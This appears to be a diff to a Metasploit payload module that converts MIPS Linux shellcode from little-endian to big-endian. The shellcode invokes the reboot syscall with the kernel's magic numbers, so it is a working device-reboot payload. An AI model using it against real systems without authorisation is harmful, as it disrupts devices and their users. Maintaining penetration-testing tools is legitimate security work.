@@ -28,7 +28,7 @@ module Metasploit3
         ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'linux',
-      'Arch'          => ARCH_MIPSLE,
+      'Arch'          => ARCH_MIPSBE,
       'Payload'       =>
         {
           'Offsets' => {} ,
@@ -39,14 +39,14 @@ module Metasploit3
 
   def generate
     shellcode =
-      "\x21\x43\x06\x3c" +  # lui     a2,0x4321
-      "\xdc\xfe\xc6\x34" +  # ori     a2,a2,0xfedc
-      "\x12\x28\x05\x3c" +  # lui     a1,0x2812
-      "\x69\x19\xa5\x34" +  # ori     a1,a1,0x1969
-      "\xe1\xfe\x04\x3c" +  # lui     a0,0xfee1
-      "\xad\xde\x84\x34" +  # ori     a0,a0,0xdead
-      "\xf8\x0f\x02\x24" +  # li      v0,4088
-      "\x0c\x01\x01\x01"    # syscall 0x40404
+      "\x3c\x06\x43\x21" +  #lui     a2,0x4321
+      "\x34\xc6\xfe\xdc" +  #ori     a2,a2,0xfedc
+      "\x3c\x05\x28\x12" +  #lui     a1,0x2812
+      "\x34\xa5\x19\x69" +  #ori     a1,a1,0x1969
+      "\x3c\x04\xfe\xe1" +  #lui     a0,0xfee1
+      "\x34\x84\xde\xad" +  #ori     a0,a0,0xdead
+      "\x24\x02\x0f\xf8" +  #li      v0,4088
+      "\x01\x01\x01\x0c"    #syscall 0x40404
 
     return super + shellcode
   end
